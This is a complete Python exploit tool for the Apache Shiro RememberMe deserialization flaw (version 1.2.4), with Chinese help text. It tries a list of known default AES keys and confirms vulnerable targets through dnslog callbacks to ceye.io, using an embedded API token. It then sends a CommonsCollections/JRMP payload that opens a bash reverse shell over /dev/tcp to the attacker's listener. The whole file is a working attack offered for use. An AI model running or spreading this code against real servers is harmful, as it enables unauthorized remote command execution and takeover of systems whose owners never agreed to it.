#!/usr/bin/env python
# coding:utf-8

import logging
import sys
import uuid
import json
import base64
import subprocess
import requests
import random
import time
from Crypto.Cipher import AES
from optparse import OptionParser, OptionGroup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Shiro_RememberMe(object):
    def __init__(self,):
        """
        :arg = sys.argv[1]

        If  not using proxy, please change to None
        : proxies = None
        """
        self.proxy = {} #{'http':"127.0.0.1:1081","https":"127.0.0.1:1081"}
        self.parseArguments()
        self._EXP_class = ["JRMPClient",'CommonsCollections5']

        if self.url is None:
            print('URL target is missing, try using -u <url> ')
            exit(0)
        check,key = self.audit()
        if check != False:
            if self.reverse_Shell != False:
                if not self.ip:
                    print("Confirm your server ip!")
                    exit(0)
                key = "kPH+bIxk5D2deZiIxcaaaA=="
                self.attck(key)

    def encode_rememberme(self,_EXP_class,key,command):
        BLOCK_SIZE = AES.block_size
        PAD_FUNC = lambda s: s + ((BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)).encode()
        AES_MODE = AES.MODE_CBC
        AES_IV = uuid.uuid4().bytes
        popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar',_EXP_class,command], stdout=subprocess.PIPE)
        encryptor = AES.new(base64.b64decode(key), AES.MODE_CBC, AES_IV)
        file_body = PAD_FUNC(popen.stdout.read())
        base64_ciphertext = base64.b64encode(AES_IV + encryptor.encrypt(file_body))
        return base64_ciphertext

    def audit(self,):
        CipherKey = ["kPH+bIxk5D2deZiIxcaaaA==","2AvVhdsgUs0FSA3SDFAdag==","3AvVhmFLUs0KTA3Kprsdag==","4AvVhmFLUs0KTA3Kprsdag==",
        "5AvVhmFLUs0KTA3Kprsdag==","5aaC5qKm5oqA5pyvAAAAAA==","6ZmI6I2j5Y+R5aSn5ZOlAA==","bWljcm9zAAAAAAAAAAAAAA==",
        "wGiHplamyXlVB11UXWol8g==","Z3VucwAAAAAAAAAAAAAAAA==","MTIzNDU2Nzg5MGFiY2RlZg==","U3ByaW5nQmxhZGUAAAAAAA==",
        "fCq+/xW488hMTCD+cmJ3aQ==","1QWLxg+NYmxraMoxAXu/Iw==","ZUdsaGJuSmxibVI2ZHc9PQ==","L7RioUULEFhRyxM7a2R/Yg==",
        "r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==","a2VlcE9uR29pbmdBbmRGaQ==","WcfHGU25gNnTxTlmJMeSpw=="]
        # CipherKey = ['fCq+/xW488hMTCD+cmJ3aQ==']
        try:
            print("[*] Try to use {} payload...".format(self._EXP_class[0]))
            for key in CipherKey:
                print("[*] Try to url {} ".format(self.url))
                command = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], 5)) + '.bgz2ol.ceye.io'
                print("[*] Try to use dnslog: {}".format(command))
                print("[*] Using Key: {}".format(key))
                base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,command)
                print("[*] base64_decodeTXT: rememberMe={}".format(base64_ciphertext.decode()))
                try:
                    response = requests.post(self.url, timeout=1, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxy) # proxies=self.proxy
                    if response.status_code == 500:
                        raise Exception("Network error occurred in the first request")
                except Exception as error:
                    print(error)
                print ('[*] Request to target URL success!\n')
                req = requests.get('http://api.ceye.io/v1/records?token=603fd72e8621857c2b4c116fc5c1ede7&type=dns',timeout=5,proxies=self.proxy)
                if req.status_code == 500:
                    raise Exception("Network error occurred in the second request")
                if command in req.text:
                    warning_info='{} 存在Shiro RememberMe 1.2.4 反序列化命令执行漏洞\r\n漏洞地址:{}\r\n漏洞详情:\n密钥：{}\r\n{}'.format(self.url,self.url,key ,"rememberMe={}".format(base64_ciphertext.decode()))
                    print(warning_info)  
                    return True,key
            return False,None

        except Exception as error:
            logging.warning(self.url)
            logging.warning(error)
            return False,None

    def attck(self,key):
        print("\033[01;32m[*] Try to use {} payload...\033[0m".format(self._EXP_class[1]))
        bash_reshell = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}' % (base64.b64encode('bash -i >& /dev/tcp/{}/{} 0>&1'.format(self.ip,self.port).encode('utf-8')).decode('ascii'))
        command = 'java -cp ysoserial.jar ysoserial.exploit.JRMPListener {} CommonsCollections5 "{}"'.format(self.JRMPListener,bash_reshell)
        print("\033[01;34m[*] Please create a command line window to enter commands\033[0m: \n\033[1;31mnc -lvvp {}\033[0m\n".format(self.ip+":"+self.port))
        print("\033[01;34m[*] Please create a command line window to enter commands\033[0m: \n\033[1;31m{}\033[0m\n".format(command))

        base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,self.ip+":"+self.JRMPListener) #设置监听
        print("\033[01;34m[*] base64_decodeTXT\033[0m: \n\033[1;31mrememberMe={}\033[0m".format(base64_ciphertext.decode()))
        response = requests.post(self.url, timeout=20, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxy) #proxies=self.proxy
        if response.status_code == 500:
            print("Network error....")
            exit(0)

    def parseArguments(self):
        usage = 'Usage: %prog [-u|--url] target extensions [options]'
        parser = OptionParser(usage)
        mandatory = OptionGroup(parser, 'Mandatory')
        mandatory.add_option('-u', '--url', help='URL target', action='store', type='string', dest='url', default=None)
        mandatory.add_option('--ip', '--reflex_IP', help='反弹shell的IP 默认当前外网地址', action='store', dest='reflexIP', default=None)
        mandatory.add_option('--port', '--reflex_PORT', help='反弹shell的PORT 默认8888', action='store', dest='reflexPORT', default='8888')
        mandatory.add_option('-l', '--JRMPListener', help='监听地址 默认3888', action='store', dest='JRMPListener', default='3888')
        mandatory.add_option('--proxy', '--http-proxy', action='store', dest='httpProxy', type='string',default=self.proxy, help='Http Proxy (example: localhost:8080')
        mandatory.add_option('--shell', '--reverse-Shell',  dest='shell', type='string',default=False, help='reverse-Shell [Arbitrary parameter]')

        parser.add_option_group(mandatory)
        options, arguments = parser.parse_args()
        self.url = options.url
        self.JRMPListener = options.JRMPListener
        self.proxy = options.httpProxy
        self.ip = options.reflexIP
        self.port = options.reflexPORT
        self.reverse_Shell = options.shell
        return options

if __name__ == "__main__":
    _ = Shiro_RememberMe()


